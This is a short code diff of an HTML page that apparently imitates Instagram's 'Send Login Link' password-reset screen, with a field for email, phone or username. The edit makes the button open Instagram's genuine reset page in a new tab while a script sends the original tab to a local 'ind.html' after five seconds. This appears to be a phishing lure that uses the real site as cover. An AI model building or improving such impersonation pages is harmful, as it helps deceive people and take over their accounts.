@@ -24,12 +24,12 @@
         
         <input type="text" placeholder="Email, Phone, or Username">
         
-        <a href="ind.html" class="reset-btn" id="nextBtn">Send Login Link</a>
+        <a href="https://www.instagram.com/accounts/password/reset/" class="reset-btn" id="nextBtn" target="_blank">Send Login Link</a>
     </div>
 
     <script>
         document.getElementById('nextBtn').addEventListener('click', function(e) {
-            // 5 ಸೆಕೆಂಡ್ (5000ms) ನಂತರ ind.html ಗೆ ರೀಡೈರೆಕ್ಟ್ ಆಗುತ್ತದೆ
+            // 5 ಸೆಕೆಂಡ್ (5000ms) ನಂತರ ನಿಮ್ಮ ind.html ಗೆ ರೀಡೈರೆಕ್ಟ್ ಆಗುತ್ತದೆ
             setTimeout(() => {
                 window.location.href = "ind.html";
             }, 5000);
